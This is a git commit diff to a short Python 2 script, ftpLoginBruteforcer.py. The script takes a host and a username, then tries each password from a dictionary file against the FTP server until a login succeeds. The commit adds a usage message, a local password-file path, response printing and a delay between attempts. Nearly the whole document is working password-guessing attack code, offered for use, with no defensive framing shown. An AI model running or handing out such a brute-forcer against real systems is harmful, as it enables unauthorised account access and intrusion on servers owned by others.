c61bccd2a4e1391cbad713ecfdaf429d0b8dc5d8
bloorq@gmail.com <bloorq@gmail.com>
2018-05-08 18:54:14 +0100

    ftpLoginBruteforcer - some updates

--- ftpLoginBruteforcer.py
+++ ftpLoginBruteforcer.py
@@ -1,6 +1,18 @@
 #!/usr/bin/python
 import ftplib
 import sys
+import time
+
+usage = """
+Usage:
+
+$ ftpLoginBruteforcer.py [HOST] [USERNAME]
+
+"""
+
+if len(sys.argv) != 3:
+    print usage
+    exit(0)
 
 ftp = ftplib.FTP(sys.argv[1])
 username = sys.argv[2]
@@ -8,14 +20,17 @@ username = sys.argv[2]
 print ftp.getwelcome()
 # pwds = ['root','123456','password']
 tries = 0
-for p in open('/Users/bl4de/hacking/dictionaries/passwords_5445.txt', 'r').readlines():
+# for p in open('/Users/bl4de/hacking/dictionaries/passwords_5445.txt', 'r').readlines():
+for p in open('./passwords.txt', 'r').readlines():
 # for p in pwds:
     try:
         tries = tries + 1
         print "[+] try {}: trying {}:{}".format(tries, username, p.strip())
-        ftp.sendcmd('USER {}'.format(username))
+        resp = ftp.sendcmd('USER {}'.format(username))
+        print resp
+        time.sleep(4)
         resp = ftp.sendcmd('PASS {}'.format(p.strip()))
-
+        print resp
         print "[+] Logged in! -> {}".format(str(resp))
         exit(0)
     except Exception, e:
